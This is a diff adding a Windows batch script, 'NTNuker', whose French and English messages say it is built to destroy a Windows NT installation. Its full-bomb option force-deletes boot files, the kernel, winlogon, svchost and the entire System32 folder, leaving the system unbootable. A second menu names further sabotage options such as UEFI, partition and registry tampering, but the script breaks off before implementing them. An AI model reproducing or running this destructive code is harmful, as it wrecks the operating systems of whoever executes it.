@@ -1,0 +1,129 @@
+@echo off
+@color 0a
+@title NukerBatch
+
+echo Bienvenue sur NTNuker, ce logiciel est fait pour détruire un OS WindowsNT.
+echo Ne l'executez pas sur votre ordinateur sous peine de voir Windows détruit.
+echo Nous ne tenons compte d'aucune responsabilité de ce que vous faites avec ce logiciel.
+echo.
+pause
+
+echo [A] Bombe a choix
+echo [B] Bombe complete
+echo.
+echo [H] Aide/Help
+echo [Q] Quitter/Leave
+choice /c:ABHQ /n
+if %errorlevel% == 1 (
+goto :selectnk
+)
+if %errorlevel% == 2 (
+goto :fullnk
+)
+if %errorlevel% == 3 (
+goto :help
+)
+if %errorlevel% == 4 (
+exit
+)
+
+:fullnk
+cls
+echo Etes vous certains de realiser cette action ? CELLE-CI RENDERA VOTRE OS INUTILISABLE
+pause
+cls
+echo Dernier avertissement: cela efface le SYSTEME D'EXPLOITATION
+pause
+cls
+del c:\bootmgr /s /f /q
+echo Deleted File: Boot Manager
+del c:\Boot /s /f /q
+echo Deleted Folder: Boot files
+del c:\Windows\System32\winload.exe /s /f /q
+echo Deleted File: Boot Loader (Legacy)
+del c:\WINDOWS\System32\OOBE\msoobe.exe /s /f /q
+echo Deleted File: MSOOBE EXE
+del c:\Windows\System32\OOBE\windeploy.exe /s /f /q
+echo Delted File: Windows Driver Deployer
+del c:\Windows\System32\winload.efi /s /f /q
+echo Deleted File: Boot Loader (Unified Extensible FW)
+del c:\Windows\System32\bcdboot.exe /s /f /q
+echo Deleted File: BCD Editor
+del c:\Windows\System32\calc.exe /s /f /q
+echo Deleted File: Calculator
+del c:\Windows\System32\control.exe /s /f /q
+echo Deleted File: Control Panel
+del c:\Windows\System32\winlogon.exe /s /f /q 
+echo Deleted File: Logon UI
+del c:\Windows\System32\diskpart.exe /s /f /q
+echo Deleted File: Disk Manager
+del c:\Windows\System32\dism.exe /s /f /q
+echo Deleted File: DISM EXE 
+del c:\Windows\System32\regedit.exe /s /f /q
+echo Deleted File: Register Editor
+del c:\Windows\System32\ntoskrnl.exe /s /f /q
+echo Deleted File: Microsoft New Technology Operating System Disks Kernel Loader
+del c:\Windows\System32\msconfig.exe /s /f /q
+echo Deleted File: Microsoft System Configuration
+del c:\Windows\System32\sethc.exe /s /f /q
+echo Deleted File: Ergonomy options manager
+del c:\Windows\System32\shutdown.exe /s /f /q
+echo Deleted File: Shutdown System
+del c:\Windows\System32\wpeutil.exe /s /f /q
+echo Deleted File: Windows Utils
+del c:\Windows\System32\mspaint.exe /s /f /q
+echo Deleted File: Paint
+del c:\Windows\System32\SnippingTool.exe /s /f /q
+echo Deleted File: Screenshot tool
+del c:\Windows\System32\svchost.exe /s /f /q
+echo Deleted File: MS SVCHOST
+del c:\Windows\System32\msinfo32.exe /s /f /q
+echo System informations panel
+del c:\Windows\System32\taskmgr.exe /s /f /q
+echo Deleted File: System Tasks Manager
+del c:\Windows\System32\userinit.exe /s /f /q
+echo Deleted File: User Init
+del c:\Windows\System32\WF.exe /s /f /q
+echo Deleted File: WF
+del c:\Windows\System32\winver.exe /s /f /q
+echo Deleted File: Version of Windows
+del c:\Windows\System32\ /s /f /q
+echo Deleted Folder: Windows NT Kernel
+pause
+cls
+echo Done.
+echo Please turn off the computer for enjoy the nuke!
+echo Personal data was saved on %USERPROFILE% :)
+pause>nul
+exit
+
+:selectnk
+cls
+echo [A] Retirer la configuration de boot
+echo [B] Retirer un composant du noyau
+echo [C] Retirer le noyau 
+echo [D] Crash Windows
+echo [E] Fausse maj Windows
+echo [F] Crash interface
+echo [G] Retirer fichiers de langues (BETA)
+echo [H] Simuler erreurs 
+echo [I] Modifications utilisateurs au hasard
+echo [J] Modifications UEFI 
+echo [K] Modifications partitions au hasard
+echo [L] Modifications registre au hasard
+echo [M] 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
